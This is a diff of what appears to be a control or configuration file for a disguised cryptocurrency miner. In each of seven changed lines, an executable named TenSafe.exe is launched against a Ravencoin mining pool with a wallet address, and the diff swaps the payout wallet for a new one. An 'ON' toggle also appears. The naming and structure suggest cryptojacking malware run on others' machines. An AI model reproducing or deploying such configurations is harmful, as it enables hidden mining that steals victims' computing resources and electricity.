@@ -15,13 +15,13 @@ Y3X--MMMMMMM.EXE--Y3X
 Y4X--MMMMMMM.EXE--Y4X
 Y5X--MMMMMMM.EXE--Y5X
 ------------------------------------------------------------------------------------------------------------------------------------
-A1A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV13@pplns -i 13 -p x--A1A
-A2A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV15@pplns -i 14 -p x--A2A
-A3A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.RV16@pplns -i 14 -p x--A3A
-A4A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1013@pplns -i 13 -p x--A4A
-A5A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1014@pplns -i 14 -p x--A5A
-A6A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.1015@pplns -i 14 -p x--A6A
-A7A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RDsgjvggNYHmBZwCgFvFxpZCQ2MHwBQLfn.cf12@pplns -i 12 -p x--A7A
+A1A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u REHEY6vDmypuR2WG7SfZsxxVibAWy2EwQZ.RV13@pplns -i 13 -p x--A1A
+A2A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u REHEY6vDmypuR2WG7SfZsxxVibAWy2EwQZ.RV15@pplns -i 14 -p x--A2A
+A3A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u REHEY6vDmypuR2WG7SfZsxxVibAWy2EwQZ.RV16@pplns -i 14 -p x--A3A
+A4A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u REHEY6vDmypuR2WG7SfZsxxVibAWy2EwQZ.1013@pplns -i 13 -p x--A4A
+A5A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u REHEY6vDmypuR2WG7SfZsxxVibAWy2EwQZ.1014@pplns -i 14 -p x--A5A
+A6A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u REHEY6vDmypuR2WG7SfZsxxVibAWy2EwQZ.1015@pplns -i 14 -p x--A6A
+A7A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u REHEY6vDmypuR2WG7SfZsxxVibAWy2EwQZ.cf12@pplns -i 12 -p x--A7A
 A9A--ON--A9A
 ------------------------------------------------------------------------------------------------------------------------------------
 A0A--\TenSafe.exe--A0A
